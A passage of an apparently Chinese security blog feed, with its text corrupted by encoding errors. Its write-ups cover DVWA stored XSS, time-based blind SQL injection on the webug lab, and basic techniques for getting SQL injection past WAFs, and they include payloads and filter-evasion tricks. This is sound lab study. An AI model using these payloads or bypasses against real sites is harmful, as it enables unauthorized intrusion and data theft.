);</span><br></pre></td></tr></table></figure><h2 id="high-1">high</h2><p>é»‘ç›’æµ‹è¯•</p><p>ä» medium æˆ‘ä»¬çŸ¥é“ Message æ˜¯ä¸å¯èƒ½äº†ï¼Œæ¥ç€å°è¯• Nameï¼Œå¤§å†™ä¸åµŒå¥—å¤±è´¥ï¼Œä½¿ç”¨åˆ«çš„æ ‡ç­¾ï¼Œæ¯”å¦‚ï¼šimgï¼Œiframeï¼Œbody æ ‡ç­¾ç»•è¿‡æˆåŠŸã€‚</p><p>ä»£ç è®²è§£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œç”¨æ­£åˆ™å®Œå…¨åœ°è¿‡æ»¤äº† script æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ scriptæ ‡ç­¾ä¸å†å¥æ•ˆã€‚</p><h2 id="impossible-1">impossible</h2><p>é»‘ç›’æµ‹è¯•</p><p>ä½¿ç”¨ä»¥ä¸‹ payload è¿›è¡Œæµ‹è¯•ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>å›æ˜¾ï¼š</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/stored_xss_impossible.png" /></p><p>æˆ‘ä»¬çœ‹åˆ° &lt;&gt; å‡è¢«å®ä½“åŒ–ç¼–ç äº†ï¼Œå‡‰å‡‰ã€‚</p><p>ä»£ç è®²è§£</p><p>ä¸å‡ºæ‰€æ–™ï¼ŒName å’Œ Message å‚æ•°éƒ½è¿›è¡Œäº† htmlspecialchars å¤„ç†ã€‚</p><p>ä¸€ä¸ªåä¹ æƒ¯ï¼š</p><p>æµ‹è¯•ç•™è¨€æ¿è¦ä¸€ä¸ªä¸ªæµ‹è¯•ï¼Œä¸è¦ä¸¤ä¸ªä¸€èµ·éƒ½è¾“å…¥ xss payloadæµ‹è¯•ï¼Œå¾ˆèƒ½ä¼šç›¸äº’å½±å“ï¼Œè¿™é‡Œå°±å› ä¸ºäºŒè€…æŒ¨ç€ï¼Œç›¸äº’å½±å“ï¼Œå¯¼è‡´æµ‹è¯•å¤±è´¥ã€‚</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/stored_xss_notice.png" /></p><h1 id="dom-xss">DOM XSS</h1><p>æœªå®Œå¾…ç»­...</p><p>æ€»ç»“å›é¡¾ï¼š</p><ol type="1"><li><p>æµ‹è¯•æ¼æ´æ—¶ï¼Œè¦ä¸€ä¸ªä¸€ä¸ªç‚¹çš„æµ‹è¯•ï¼Œä¸è¦ç›¸é‚»çš„ç‚¹å°±ä¸€èµ·æµ‹è¯•ï¼Œä¸ç„¶ï¼Œå¦‚æœä»–ä»¬åœ¨ä»£ç ä¸­æ˜¯ä¸€èµ·çš„ï¼Œå®¹æ˜“ç›¸äº’å½±å“ã€‚</p></li><li><p>ä¿®å¤æ–¹å¼ï¼š è¾“å…¥è¿‡æ»¤ï¼šæå€¡ç™½åå•ï¼Œåœ¨æœåŠ¡ç«¯å¯¹ç”¨æˆ·çš„è¾“å…¥åšå¥½é™åˆ¶</p><p>è¾“å‡ºè¿‡æ»¤ï¼šå¦‚æœæ˜¯è¾“å‡ºåˆ° html ä¸­ï¼Œé‚£è¿›è¡Œ html ç¼–ç ï¼›å¦‚æœæ˜¯è¾“å‡ºåˆ° jsä¸­ï¼Œjs è½¬ä¹‰</p></li><li><p>å­˜å‚¨å‹ XSSä¸€æ—¦å­˜å‚¨ä¸Šæ¯æ¬¡è®¿é—®å¯¹åº”åœ°æ–¹éƒ½ä¼šè§¦å‘ï¼Œå¾ˆçƒ¦ã€‚å°¤å…¶åœ¨æµ‹è¯•åˆ«äººçš„ç½‘ç«™çš„æ—¶å€™ï¼Œä¸è¦ä½¿ç”¨å¼¹çª—çš„XSS payloadï¼Œæœ€å¥½ä½¿ç”¨ XSS å¹³å°æ£€æµ‹ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webugä¹‹postæ³¨å…¥</title>
      <link href="/blog/2019/08/04/websec/sql_injection/post_injection_of_webug/"/>
      <url>/blog/2019/08/04/websec/sql_injection/post_injection_of_webug/</url>
      
        <content type="html"><![CDATA[<p>å…·ä½“æ³¨å…¥æµç¨‹ï¼Œä¸å†è®²è§£ï¼Œä¸‹é¢å¸–å­ä¸­æœ‰ï¼Œè¿™é‡Œä¸»è¦æ¢ç©¶ä»¥åŠè®°å½•è‡ªå·±çš„ä¸€ç‚¹ç–‘æƒ‘ï¼Œå³ï¼šä¸ºä»€ä¹ˆæŸ¥ä¸åˆ°ç»“æœï¼Œè¿›è¡Œæ—¶é—´ç›²æ³¨æ—¶ï¼Œå°±å¾—ç”¨or ï¼Œç”¨ and ä¸è¡Œï¼Ÿ</p><p><ahref="https://www.twblogs.net/a/5cba215abd9eee0eff45eeac/zh-cn">webug4.0 ç¬¬å››å…³ POST æ³¨å…¥</a></p><h1 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h1><h2 id="and-or-çŸ­è·¯">and or çŸ­è·¯</h2><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦çŸ¥é“ mysql çš„ and ä¸ or éƒ½æœ‰çŸ­è·¯æ•ˆæœ</p><p>and å’Œ or éƒ½æ˜¯æ“ä½œç¬¦ï¼Œä½† and çš„æœ‰ä¼˜å…ˆçº§åœ¨ or ä¹‹å‰ï¼Œ ä¹Ÿå°±æ˜¯åœ¨æœ‰ and å’Œor åŒæ—¶å­˜åœ¨çš„æƒ…å†µï¼Œä¼˜å…ˆè®¡ç®— and æ“ä½œç¬¦ï¼Œç„¶åå†è®¡ç®— or æ“ä½œç¬¦ã€‚</p><blockquote><p>OR MySQL uses short-circuit evaluation for the OR operator. In otherwords, MySQL stops evaluating the remaining parts of the statement whenit can determine the result.</p></blockquote><blockquote><p>AND When evaluating an expression that has the AND operator, MySQLstops evaluating the remaining parts of the expression whenever it candetermine the result. This function is called short-circuitevaluation.</p></blockquote><p>å½“å‰é¢æ¡ä»¶æ»¡è¶³æ—¶ AND éœ€è¦æ‰§è¡Œåè¾¹ OR ä¸éœ€è¦æ‰§è¡Œåè¾¹å½“å‰é¢æ¡ä»¶ä¸æ»¡è¶³æ—¶ AND ä¸éœ€è¦æ‰§è¡Œåè¾¹ OR éœ€è¦æ‰§è¡Œåè¾¹</p><h2 id="å‡½æ•°è¿”å›å€¼">å‡½æ•°è¿”å›å€¼</h2><p>mysql å‡½æ•°æ‰§è¡ŒæˆåŠŸï¼Œè¿”å›å€¼ä¸º 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">+----------+</span><br><span class="line">| sleep(2) |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (2.00 sec)</span><br></pre></td></tr></table></figure><h1 id="sql-è¯­å¥è¯¦è§£">sql è¯­å¥è¯¦è§£</h1><p>ä¸‹é¢æˆ‘ä»¬è®²è§£å‡ ä¸ª sql è¯­å¥çš„åŸç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | passwd   |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    2 | doc      | passwd   |</span><br><span class="line">|    3 | doctor   | passwd   |</span><br><span class="line">|    3 | elite    | passwd   |</span><br><span class="line">|    1 | NULL     | passw    |</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    1 | 0        | pass     |</span><br><span class="line">|    1 |          | pas      |</span><br><span class="line">|    1 |  dewe    | ds       |</span><br><span class="line">|    1 |  3fd     | asd      |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œå¯ä»¥çœ‹åˆ° tuser è¡¨ä¸­æœ‰ 16 æ¡æ•°æ®ï¼Œå…¶ä¸­ä¸¤æ¡ç¼–å·ä¸º 3 çš„æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser where id=3 or sleep(3);</span><br><span class="line">+------+----------+--------+</span><br><span class="line">| id   | username | passwd |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">|    3 | doctor   | passwd |</span><br><span class="line">|    3 | elite    | passwd |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">2 rows in set (42.01 sec)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ¡è¯­å¥ mysql ä¼šéå†æ¯ä¸€æ¡è®°å½•ï¼Œåœ¨éå†åˆ°ä¸€æ¡è®°å½•æ—¶ï¼Œå®ƒä¼šä¾æ¬¡æ‰§è¡Œwhere åé¢çš„æ¡ä»¶ã€‚æ€»å…±æœ‰ä¸¤æ­¥æ“ä½œï¼š</p><p>å…ˆåˆ¤æ–­ id=3 ä¸å¦ï¼Œå› ä¸ºæ˜¯ or è¿æ¥ä¸¤ç§æ“ä½œï¼Œæ‰€ä»¥å¦‚æœid=3ï¼Œé‚£ä¹ˆåé¢çš„æ“ä½œä¾¿è¢«çŸ­è·¯ï¼Œä¸å†æ‰§è¡Œã€‚å¦‚æœ id ä¸ç­‰äº3ï¼Œæ‰§è¡Œåé¢æ“ä½œï¼Œè¿™é‡Œå°±æ˜¯æ‰§è¡Œå‡½æ•° sleep(3)</p><p>ä¸Šé¢æ‰§è¡Œæ—¶é—´è®¡ç®—ï¼šä¸€å…± 16 æ¡æ•°æ®ï¼Œ14 æ¡ id ä¸ä¸º 3ï¼Œä¼šæ‰§è¡Œsleep(3)ã€‚å› æ­¤æ˜¯ 14*3=42ï¼Œç„¶åå†åŠ ä¸Š 0.01 ç§’çš„å…¶ä»–æ—¶é—´ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">33.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">3</span><span class="operator">*</span><span class="built_in">count</span>(<span class="operator">*</span>)`sleepçš„æ—¶é—´` <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> sleepçš„æ—¶é—´    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span>             <span class="number">33</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ï¼Œæˆ‘ä»¬ä½¿ç”¨ id =1 and sleep(3)ï¼Œå³ï¼šå½“ id = 1 æ—¶ï¼Œç”±äºæ˜¯ andä¸èƒ½ç¡®å®šç»“æœï¼Œæ‰€ä»¥è¿˜ä¼šæ‰§è¡Œ sleep() å‡½æ•°ã€‚å½“ id =1 ä¸ºå‡æ—¶ï¼Œå¯ä»¥ç¡®å®šæ•´ä¸ªand è¡¨è¾¾å¼çš„å€¼ï¼Œå°±ä¸ä¼šæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</p><p>å°ç»“ï¼š</p><p>å½“è®°å½•ä¸­ id æ²¡æœ‰åŒ¹é…æ¡ä»¶æ—¶ï¼Œä½¿ç”¨ and sleep(3)æ²¡ç”¨ï¼Œå› ä¸ºå‰é¢å°±èƒ½ç¡®å®šè¡¨è¾¾å¼ç»“æœä¸ºå‡äº†ã€‚</p><p>å½“è®°å½•ä¸­ id å…¨éƒ¨åŒ¹é…æ¡ä»¶æ—¶ï¼Œä½¿ç”¨ or sleep(3)æ²¡ç”¨ï¼Œå› ä¸ºå‰é¢å°±èƒ½ç¡®å®šè¡¨è¾¾å¼ç»“æœä¸ºçœŸäº†ã€‚</p><p>ä¸‹é¢æµ‹è¯•ä¸€äº›æŠ¥é”™çš„å‡½æ•°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">10</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x23</span>,version()));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;#8.0.12&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> sleep(<span class="number">2</span>) <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x23</span>,version()));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;#8.0.12&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">10</span> <span class="keyword">and</span> pow(<span class="number">999</span>,<span class="number">3241324</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;pow(999,3241324)&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> pow(<span class="number">999</span>,<span class="number">32414</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;pow(999,32414)&#x27;</span></span><br></pre></td></tr></table></figure><p>æ³¨ï¼šä»ä¸Šé¢è¡¨çš„æ•°æ®çŸ¥é“ï¼Œtuser è¡¨ä¸­æ²¡æœ‰ id =10 çš„è®°å½•ã€‚</p><p>æµ‹è¯•å‘ç°ä¸ç®¡è®°å½•ä¸­æœ‰æ²¡æœ‰åŒ¹é…çš„ idï¼Œä¸ç®¡æ˜¯ç”¨ and æˆ–orï¼Œéƒ½å¯ä»¥æŠ¥é”™ã€‚è¿™ä¸ªçš„å…·ä½“åŸç†å’±ä¹Ÿä¸æ¸…æ¥šï¼Œæµ‹è¯•ç€å°±æ˜¯è¿™æ ·ã€‚</p><p>å½“ç„¶ï¼Œwebug çš„ post æ³¨å…¥è¿™å…³ï¼Œä¸æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼Œå’±ä¸èƒ½ç”¨æŠ¥é”™ç›²æ³¨ã€‚</p><p>æ€»ç»“ï¼š</p><ol type="1"><li><p>åœ¨ where id=1 åé¢åŠ  and/orå‡½æ•°ï¼Œä¸ä¼šå½±å“ç­›é€‰ç»“æœï¼ˆå½“ç„¶ï¼ŒæŠ¥é”™çš„é™¤å¤–ï¼ŒæŠ¥é”™å°±æ²¡ç»“æœäº†ã€‚ï¼‰</p></li><li><p>å…»æˆä¹ æƒ¯ï¼Œä½¿ç”¨æ—¶é—´ç›²æ³¨çš„æ—¶å€™ï¼Œand sleep(3) å’Œ or sleep(3)éƒ½è¯•è¯•ã€‚</p></li><li><p>æŠ¥é”™æ³¨å…¥æ—¶ï¼Œä½¿ç”¨ and/orï¼Œå¯¹æˆ‘ä»¬æ³¨å…¥æ¥è¯´ï¼Œæ²¡åŒºåˆ«ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php+mysql ç»• WAF åŸºç¡€</title>
      <link href="/blog/2019/08/04/websec/sql_injection/php-mysql-cross-waf/"/>
      <url>/blog/2019/08/04/websec/sql_injection/php-mysql-cross-waf/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡åªé’ˆå¯¹ php mysql ç»•è¿‡ WAFçš„ä¸€äº›åŸºç¡€æ–¹å¼åšä¸€äº›æ€»ç»“è®°å½•ï¼Œå†™è¿™ç¯‡ç¬”è®°çš„åˆè¡·æ˜¯å› ä¸ºè™½ç„¶åœ¨ç½‘ä¸Šä¹Ÿèƒ½æ‰¾åˆ°è®²è§£è¿™äº›æŠ€å·§çš„æ–‡ç« ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ç§æ–¹å¼å¯ä»¥ç»•è¿‡ï¼Ÿå°±å¾ˆåˆ«æ‰­ã€‚äºæ˜¯ï¼Œæƒ³æ€»ç»“ä¸€ä¸‹åŸå› ã€‚å¦‚æœæœ‰ä¸æ°å½“çš„åœ°æ–¹æ¬¢è¿ä¸‹æ–¹ç•™è¨€å‘Šè¯‰æˆ‘ã€‚</p><p>æœ‰äº›æ€è·¯å¯èƒ½å¯¹åˆ«çš„ç¯å¢ƒé€‚ç”¨ï¼Œä½†æ˜¯åœ¨è¿™é‡Œæˆ‘å¹¶ä¸æƒ³å°†å…¶æ··èµ·æ¥è°ˆï¼Œæ¯ä¸ªå¹³å°éƒ½æœ‰å…¶ç‰¹ç‚¹ï¼Œè°ˆåˆ°å…¶ä»–å¹³å°æ—¶ï¼Œå¦‚æœæœ‰æ€æƒ³ç›¸ä¼¼çš„ï¼Œæˆ‘ä¼šå†å•ç‹¬å†™ç¬”è®°è®°å½•çš„ã€‚</p><h1 id="åŸºç¡€ç»•è¿‡æ–¹å¼">åŸºç¡€ç»•è¿‡æ–¹å¼ï¼š</h1><h2 id="åŒå­—ç¬¦ä¹Ÿç§°åŒå†™æ›¿æ¢å…³é”®å­—">åŒå­—ç¬¦ï¼ˆä¹Ÿç§°åŒå†™ã€æ›¿æ¢å…³é”®å­—ï¼‰</h2><p>æ¯”å¦‚ï¼šå¯¹ and or union select ç­‰å•ä¸ªå­—çš„æ£€æµ‹ï¼Œå¯ä»¥ä½¿ç”¨oorrï¼Œananddï¼Œuniuniononï¼Œselselectect ç­‰ç»•è¿‡ã€‚</p><p>é€‚ç”¨ï¼šä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¼€å‘è€…ä¼šå†™ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥è¿‡æ»¤éœ€è¦è¿‡æ»¤çš„ä¸œè¥¿ã€‚è¿™é‡Œä¼šç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…or andç­‰ä»–æƒ³è¦è¿‡æ»¤çš„å…³é”®å­—ï¼Œç„¶åè°ƒç”¨å‡½æ•°ï¼Œå°†é‡‡å‚æ•°ä¼ é€’è¿›å»è¿›è¡Œæ£€æµ‹ã€‚å¼€å‘è€…åœ¨å¯¹and ç­‰å…³é”®å­—è¿›è¡Œè¿‡æ»¤æ—¶ï¼Œå¾€å¾€ä½¿ç”¨æ­£åˆ™åŒ¹é…ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…ä¸­æ²¡æœ‰ä½¿ç”¨ gå‚æ•°ï¼Œå³ï¼šå¾ªç¯åŒ¹é…ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨åŒå­—ç¬¦ç»•è¿‡ã€‚</p><h2 id="æ•°å­¦ç¬¦å·ç»•è¿‡">æ•°å­¦ç¬¦å·ç»•è¿‡</h2><h3 id="and-or-è¿‡æ»¤ç»•è¿‡">and or è¿‡æ»¤ç»•è¿‡</h3><p>and å¯ä»¥ç”¨ &amp;&amp; ä»£æ›¿ï¼Œä½†æ˜¯æ³¨æ„ç”±äº &amp; åœ¨ urlä¸­ç‰¹æ®Šä½œç”¨ï¼ˆä¾‹å¦‚ï¼šè¿æ¥ get å‚æ•°ï¼‰ï¼Œæ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦è¿›è¡Œ url ç¼–ç ã€‚</p><p>or å¯ä»¥ç”¨ || ä»£æ›¿ï¼Œæ³¨æ„ï¼š||ä¸ç”¨ urlç¼–ç ï¼Œç›´æ¥ç”¨å³å¯ï¼Œå› ä¸ºå®ƒä¸æ˜¯ä»€ä¹ˆç‰¹æ®Šï¼Œä¿ç•™å­—ä»€ä¹ˆçš„ã€‚</p><p>é€‚ç”¨ï¼šå¥½å¤š WAF åªå¯¹ andã€orçš„è‹±æ–‡å•è¯è¿›è¡Œäº†æ­£åˆ™åŒ¹é…ï¼Œæ²¡æœ‰å¯¹å…¶å¯¹åº”å­—ç¬¦è¿›è¡ŒåŒ¹é…ã€‚</p><p>åŸå› ï¼šæ¯”å¦‚ï¼šåŸºäºé»‘åå•çš„ WAFï¼Œä¸ä¼šå¯¹æ”¶åˆ°çš„ HTTPæŠ¥æ–‡è¿›è¡Œè§£ç ï¼Œå†æ¯”å¦‚ï¼šWAF å‚å•†ç–å¿½å¤§æ„ï¼ˆ....ï¼‰</p><p>æ³¨ï¼šå¯¹äº ç¬¦å·&amp;ï¼ˆæœªç¼–ç çš„&amp;ï¼‰å†è¿›è¡Œ url è§£ç ï¼Œä¹Ÿè¿˜æ˜¯&amp;ã€‚</p><h3 id="æ¯”è¾ƒæ“ä½œç¬¦ç»•è¿‡">æ¯”è¾ƒæ“ä½œç¬¦ç»•è¿‡</h3><p>åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œåœ¨çˆ†ç ´çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒæ“ä½œç¬¦æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚å¦‚æœæ— æ³•ä½¿ç”¨æ¯”è¾ƒæ“ä½œç¬¦ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ°greatestï¼Œstrcmp, in, between æ¥è¿›è¡Œç»•è¿‡äº†ã€‚</p><p>GREATEST(n1,n2,n3,..........)</p><p>GREATEST()å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1, n2, n3, ç­‰)ç»„çš„æœ€å¤§å€¼ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> passwd<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> <span class="keyword">and</span> greatest(ascii(substr(version(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">56</span>;</span><br></pre></td></tr></table></figure><p>æœ¬ä¾‹ä¸­ä½¿ç”¨ï¼šascii(substr(version(),1,1)) ä¸ 1æ¯”è¾ƒï¼Œå½“ç„¶æ˜¯è¿”å›å‰è€…ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡ä¸ ASCIIç å­—ç¬¦æ¯”è¾ƒï¼Œçœ‹é¡µé¢æ˜¾ç¤ºæ­£å¸¸ä¸å¦æ¥çŒœå­—ç¬¦ã€‚ï¼ˆæ³¨ï¼š8 çš„ ascii ç ä¸º 56ï¼‰</p><p>strcmp (str1, str2)</p><p>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰è¿”å›0ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¹æ®å½“å‰çš„æ’åºå°äºç¬¬äºŒä¸ªå‚æ•°é¡ºåºè¿”å› -1ï¼Œå¦åˆ™è¿”å›1ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> passwd<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> <span class="keyword">and</span> strcmp(ascii(substr(version(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">56</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸ä¸Šé¢æœ‰äº›ä¸åŒçš„æ˜¯ï¼Œç›¸ç­‰æ—¶è¿”å›é›¶ï¼Œé¡µé¢æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œå½“ç„¶ï¼Œå¦‚æœä½ è§‰å¾—åˆ«æ‰­ï¼Œå¯ä»¥åœ¨å‰é¢åŠ ä¸€ä¸ªï¼å–åã€‚</p><h2 id="mysql-c-é£æ ¼æ³¨é‡Šå˜ä½“">mysql C é£æ ¼æ³¨é‡Šå˜ä½“</h2><p>è¡¥å……ï¼šmysql çš„æ³¨é‡Šï¼š</p><ul><li><p>å•è¡Œæ³¨é‡Šï¼š# æˆ– -- ï¼ˆä¸¤ä¸ªè¿å­—ç¬¦åŠ ä¸€ä¸ª whitespaceæˆ–è€…æ§åˆ¶å­—ç¬¦ï¼Œæ¯”å¦‚ï¼šç©ºæ ¼ï¼Œtabï¼Œæ¢è¡Œç­‰)</p></li><li><p>C é£æ ¼æ³¨é‡Šï¼ˆå¯è·¨è¡Œæ³¨é‡Šï¼Œå¯å†…è”æ³¨é‡Šï¼‰ï¼š/**/</p></li><li><p>C é£æ ¼æ³¨é‡Šçš„å˜ä½“ï¼š/*!*/</p></li></ul><p>C é£æ ¼æ³¨é‡Šçš„å˜ä½“ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*! MySQL-specific code */</span></span><br></pre></td></tr></table></figure><p>MySQL æœåŠ¡å™¨èƒ½å¤Ÿè§£æå¹¶æ‰§è¡Œæ³¨é‡Šä¸­çš„ä»£ç ï¼Œå°±åƒå¯¹å¾…å…¶ä»– MySQLè¯­å¥ä¸€æ ·ï¼Œä½†å…¶ä»– SQLæœåŠ¡å™¨å°†å¿½ç•¥è¿™äº›æ‰©å±•ã€‚é€šè¿‡æ­¤æ ¼å¼çš„æ³¨é‡Šï¼Œæ‚¨å¯ä»¥ç¼–å†™åŒ…å« MySQLæ‰©å±•çš„ä»£ç ï¼Œè€Œä¸”æ˜¯å¯ç§»æ¤çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 